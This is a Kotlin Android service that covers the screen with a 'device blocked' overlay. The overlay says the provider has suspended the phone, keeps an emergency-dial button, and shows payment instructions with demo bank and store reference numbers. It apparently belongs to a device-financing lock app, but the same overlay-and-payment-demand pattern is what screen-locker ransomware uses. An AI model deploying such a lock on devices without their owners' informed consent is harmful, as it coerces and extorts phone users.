package com.codecraft.control

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.graphics.PixelFormat
import android.os.Build
import android.os.IBinder
import android.view.Gravity
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

class LockOverlayService : Service() {

    private lateinit var windowManager: WindowManager
    private var overlayView: LinearLayout? = null

    override fun onBind(intent: Intent?): IBinder? {
        return null // Not binding to anything
    }

    override fun onCreate() {
        super.onCreate()
        
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

        // Create the layout for the overlay
        overlayView = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.BLACK) // Black background
            setPadding(50, 50, 50, 50)
        }

        // Add a warning title
        val titleView = TextView(this).apply {
            text = "DISPOSITIVO BLOQUEADO"
            textSize = 24f
            setTypeface(null, android.graphics.Typeface.BOLD)
            setTextColor(Color.parseColor("#EF4444")) // Red text
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 20)
        }
        overlayView?.addView(titleView)

        // Add a message
        val messageView = TextView(this).apply {
            text = "Este equipo ha sido suspendido por su proveedor. Para reactivarlo, por favor regularice su situación."
            textSize = 16f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 60)
        }
        overlayView?.addView(messageView)

        // Botón de Llamadas de Emergencia (Gris oscuro con texto blanco)
        val btnEmergency = Button(this).apply {
            text = "LLAMADAS DE EMERGENCIA"
            textSize = 16f
            setBackgroundColor(Color.parseColor("#374151")) // Gris oscuro
            setTextColor(Color.WHITE)
            setPadding(40, 30, 40, 30)
            setOnClickListener {
                try {
                    val intent = Intent(Intent.ACTION_DIAL).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK
                    }
                    startActivity(intent)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        overlayView?.addView(btnEmergency)

        // Spacer between buttons
        val spacer = TextView(this).apply {
            setPadding(0, 10, 0, 10)
        }
        overlayView?.addView(spacer)

        // Botón de Cómo Pagar (Azul moderno con texto blanco)
        val btnHowToPay = Button(this).apply {
            text = "CÓMO PAGAR"
            textSize = 16f
            setBackgroundColor(Color.parseColor("#2563EB")) // Azul moderno
            setTextColor(Color.WHITE)
            setPadding(40, 30, 40, 30)
            setOnClickListener {
                try {
                    val builder = android.app.AlertDialog.Builder(this@LockOverlayService)
                    builder.setTitle("Instrucciones de Pago")
                    builder.setMessage("Para reactivar su servicio, realice su pago en:\n\n" +
                            "• Transferencia Bancaria:\n" +
                            "  Banco: Banco de Demostración\n" +
                            "  Cuenta CLABE: 1234 5678 9012 3456 78\n" +
                            "  Titular: CodeCraft S.A.\n\n" +
                            "• Tiendas de Conveniencia (Corresponsales):\n" +
                            "  - OXXO / Walmart (Ref: 987654321)\n" +
                            "  - Puntos de recarga autorizados\n\n" +
                            "Su dispositivo se reactivará automáticamente después de procesar el pago.")
                    builder.setPositiveButton("Entendido", null)
                    val dialog = builder.create()
                    
                    // Configurar tipo de ventana especial para Services
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        dialog.window?.setType(WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
                    } else {
                        @Suppress("DEPRECATION")
                        dialog.window?.setType(WindowManager.LayoutParams.TYPE_SYSTEM_ALERT)
                    }
                    
                    dialog.show()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
        overlayView?.addView(btnHowToPay)

        // Configure WindowManager LayoutParams
        val layoutFlag: Int = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_PHONE
        }

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            layoutFlag,
            // Flags to prevent interaction with things behind the view,
            // and keep screen on (optional for lock screen)
            WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        )

        // Add the view to the window manager
        try {
            windowManager.addView(overlayView, params)
        } catch (e: Exception) {
            Toast.makeText(this, "Error al mostrar overlay: ${e.message}", Toast.LENGTH_LONG).show()
            stopSelf()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        // Remove the view when the service is destroyed
        if (overlayView != null) {
            windowManager.removeView(overlayView)
            overlayView = null
        }
    }
}
